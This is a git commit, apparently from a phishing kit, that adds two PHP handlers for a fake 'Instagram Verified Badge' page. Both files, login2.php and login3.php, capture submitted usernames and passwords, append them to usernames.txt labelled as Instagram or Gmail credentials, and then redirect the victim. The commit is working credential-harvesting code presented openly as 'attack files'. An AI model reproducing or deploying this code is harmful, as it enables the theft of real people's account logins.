dbf8cdfea59d56ce8467931a4463bc8c0b086415
AnonUD4Y <AnonUD4Y@gmail.com>
2019-03-02 13:23:59 +0530

    Instagram Verified Badge Attack Files

---
+++ WebPages/Instagram_VerifiedBadge/login2.php
@@ -0,0 +1,7 @@
+<?php
+include 'ip.php';
+
+file_put_contents("usernames.txt", "Instagram Credentials:: [EMAIL]: " . $_POST['username'] . " [PASS]: " . $_POST['password'] . "\n", FILE_APPEND);
+header('Location:/index2.html');
+exit();
+
---
+++ WebPages/Instagram_VerifiedBadge/login3.php
@@ -0,0 +1,5 @@
+<?php
+file_put_contents("usernames.txt", "GMAIL CREDENTIALS:: [EMAIL]: " . $_POST['username'] . " [PASS]: " . $_POST['password'] . "\n", FILE_APPEND);
+header('Location:/index3.html');
+exit();
+
